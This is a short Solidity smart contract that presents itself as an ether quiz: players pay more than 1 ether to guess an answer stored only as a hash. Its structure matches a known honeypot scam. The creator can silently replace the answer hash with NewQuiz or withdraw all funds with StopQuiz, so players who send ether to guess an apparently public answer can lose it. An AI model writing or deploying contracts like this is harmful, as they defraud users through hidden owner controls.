pragma solidity ^0.4.20;

contract WhatIsIt
{
    bytes32 responseHash;
    string public Question;
    address questionSender;

    function Answer(string guess)
    public payable {
        if (responseHash == keccak256(guess) && msg.value>1 ether) {
            msg.sender.transfer(this.balance);
        }
    }
 
    function StartQuiz(string question, string response)
    public payable {
        if (responseHash==0x0) {
            responseHash = keccak256(response);
            Question = question;
            questionSender = msg.sender;
        }
    }

    function StopQuiz()
    public payable {
        if (msg.sender==questionSender) {
            msg.sender.transfer(this.balance);
        }
    }

    function NewQuiz(string question, bytes32 _responseHash)
    public payable {
        if (msg.sender==questionSender) {
            Question = question;
            responseHash = _responseHash;
        }
    }

    function () public payable { }
}